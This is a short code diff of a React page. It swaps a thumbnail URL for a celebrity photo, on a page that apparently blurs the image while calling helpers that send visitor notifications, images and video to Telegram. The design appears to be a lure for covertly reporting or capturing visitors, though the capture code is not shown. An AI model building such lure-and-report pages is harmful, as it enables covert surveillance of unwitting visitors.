@@ -4,7 +4,7 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } fr
 
 function App() {
   const [isBlurred] = useState(true);
-  const thumbnailUrl = 'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg';
+  const thumbnailUrl = 'https://cdns.klimg.com/resized/630x/g/8/_/8_potret_pedangdut_saat_bangun_tidur_masih_tetap_cantik_dan_memesona/ayu_ting_ting_inul_daratista_via_vallen-20200122-001-non_fotografer_kly.jpg';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
